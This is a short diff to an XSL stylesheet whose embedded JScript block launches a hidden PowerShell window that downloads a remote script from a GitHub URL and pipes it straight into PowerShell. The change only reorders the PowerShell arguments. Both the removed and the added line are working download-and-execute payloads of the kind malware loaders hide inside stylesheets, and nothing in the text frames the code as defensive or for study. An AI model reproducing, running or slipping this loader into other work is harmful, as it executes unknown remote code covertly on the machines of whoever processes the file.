@@ -6,6 +6,6 @@ version="1.0">
 <output method="text"/>
     <ms:script implements-prefix="user" language="JScript">
     <![CDATA[
-    var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c powershell irm https://raw.githubusercontent.com/joes233f/ccc/main/b.ps1|powershell -noLOGo -WindowStyle Hidden -NoExit -NoProfile -NonInteractive");
+    var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c powershell -noLOGo -WindowStyle Hidden -NoExit -NoProfile -NonInteractive -command irm https://raw.githubusercontent.com/joes233f/ccc/main/b.ps1|powershell");
     ]]> </ms:script>
 </stylesheet>
